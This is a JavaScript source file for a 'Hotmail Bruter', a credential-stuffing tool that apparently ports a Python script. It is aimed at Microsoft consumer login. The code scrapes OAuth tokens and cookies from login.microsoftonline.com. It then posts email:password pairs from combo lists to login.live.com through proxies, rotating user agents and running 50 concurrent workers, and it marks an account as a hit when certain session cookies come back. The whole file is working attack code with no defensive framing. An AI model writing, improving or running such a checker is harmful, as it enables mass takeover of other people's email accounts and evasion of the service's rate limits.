// ============================================================
//  Hotmail Bruter — 1:1 port of main-5.py (KurdishPy logic)
//  Uses OAuth2 consumers endpoint → login.live.com POST
//  Hit = JSH + JSHP cookies present after auth attempt
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runPool } = require("./worker-pool");

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
];

function randomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function uuid4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

/**
 * getTokens — exact 1:1 of Python getTokens()
 * Hits the OAuth2 authorize page, extracts urlPost, PPFT, cookies.
 * Retries up to 4 times just like the original.
 */
async function getTokens(email) {
  for (let attempt = 0; attempt < 4; attempt++) {
    try {
      const params = new URLSearchParams({
        client_info: "1",
        haschrome: "1",
        login_hint: email,
        mkt: "en",
        response_type: "code",
        client_id: "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
        scope: "profile openid offline_access https://outlook.office.com/M365.Access",
        redirect_uri: "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
      });

      const url = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?${params.toString()}`;

      const res = await proxiedFetch(url, {
        method: "GET",
        headers: {
          Connection: "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "User-Agent": randomUA(),
          "return-client-request-id": "false",
          "client-request-id": uuid4(),
          "x-ms-sso-ignore-sso": "1",
          "correlation-id": uuid4(),
          "x-client-ver": "1.1.0+9e54a0d1",
          "x-client-os": "28",
          "x-client-sku": "MSAL.xplat.android",
          "x-client-src-sku": "MSAL.xplat.android",
          "X-Requested-With": "com.microsoft.outlooklite",
        },
        redirect: "follow",
        signal: AbortSignal.timeout(12000),
      });

      const text = await res.text();

      if (!text.includes('"urlPost":"')) continue;

      const urlPost = text.split('"urlPost":"')[1].split('",')[0];
      const PPFT = text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0];

      // Extract cookies from response headers
      const setCookies = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
      const cookieJar = {};
      for (const sc of setCookies) {
        const [kv] = sc.split(";");
        const eqIdx = kv.indexOf("=");
        if (eqIdx > 0) cookieJar[kv.slice(0, eqIdx).trim()] = kv.slice(eqIdx + 1).trim();
      }

      const finalUrl = res.url || "";
      const refBase = finalUrl.includes("haschrome=1") ? finalUrl.split("haschrome=1")[0] : finalUrl;

      return {
        urlPost,
        PPFT,
        refBase,
        MSPRequ: cookieJar.MSPRequ || "",
        uaid: cookieJar.uaid || "",
        RefreshTokenSso: cookieJar.RefreshTokenSso || "",
        MSPOK: cookieJar.MSPOK || "",
        OParams: cookieJar.OParams || "",
      };
    } catch {
      continue;
    }
  }
  return null;
}

/**
 * checkAccount — exact 1:1 of Python check_account()
 * Returns { email, password, status: "hit" | "bad" | "error" }
 */
async function checkAccount(email, password) {
  try {
    const tokens = getTokens(email);
    const t = await tokens;
    if (!t) return { email, password, status: "bad" };

    const payload = new URLSearchParams({
      i13: "1", login: email, loginfmt: email, type: "11",
      LoginOptions: "1", lrt: "", lrtPartition: "", hisRegion: "",
      hisScaleUnit: "", passwd: password, ps: "2",
      psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
      canary: "", ctx: "", hpgrequestid: "", PPFT: t.PPFT,
      PPSX: "PassportR", NewUser: "1", FoundMSAs: "",
      fspost: "0", i21: "0", CookieDisclosure: "0",
      IsFidoSupported: "0", isSignupPost: "0",
      isRecoveryAttemptPost: "0", i19: "9960",
    });

    const res = await proxiedFetch(t.urlPost, {
      method: "POST",
      headers: {
        Host: "login.live.com",
        Connection: "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        Origin: "https://login.live.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": randomUA(),
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        Referer: `${t.refBase}haschrome=1`,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        Cookie: `MSPRequ=${t.MSPRequ};uaid=${t.uaid};RefreshTokenSso=${t.RefreshTokenSso};MSPOK=${t.MSPOK};OParams=${t.OParams}`,
      },
      redirect: "manual",
      signal: AbortSignal.timeout(12000),
    });

    // Check for JSH + JSHP cookies (same logic as Python)
    const setCookies = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    const cookieNames = new Set();
    for (const sc of setCookies) {
      const name = sc.split("=")[0].trim();
      cookieNames.add(name);
    }

    if (cookieNames.has("JSH") && cookieNames.has("JSHP")) {
      return { email, password, status: "hit" };
    }

    return { email, password, status: "bad" };
  } catch {
    return { email, password, status: "bad" };
  }
}

/**
 * runBruter — main entry, mirrors Python main() w/ ThreadPoolExecutor
 * @param {string[]} combos  - array of "email:password"
 * @param {number}   threads - concurrency (default 50 like original)
 * @param {Function} onResult - callback(result, done, total)
 * @param {AbortSignal} signal
 */
async function runBruter(combos, threads = 50, onResult, signal) {
  const items = combos
    .filter((c) => c.includes(":"))
    .map((c) => {
      const [email, ...rest] = c.split(":");
      return { email: email.trim(), password: rest.join(":").trim() };
    })
    .filter((i) => i.email && i.password);

  const results = await runPool({
    items,
    concurrency: threads,
    signal,
    scope: "bruter",
    runner: async (item) => {
      const r = await checkAccount(item.email, item.password);
      return { result: r };
    },
    onResult,
  });

  return results.filter(Boolean);
}

module.exports = { runBruter, checkAccount };
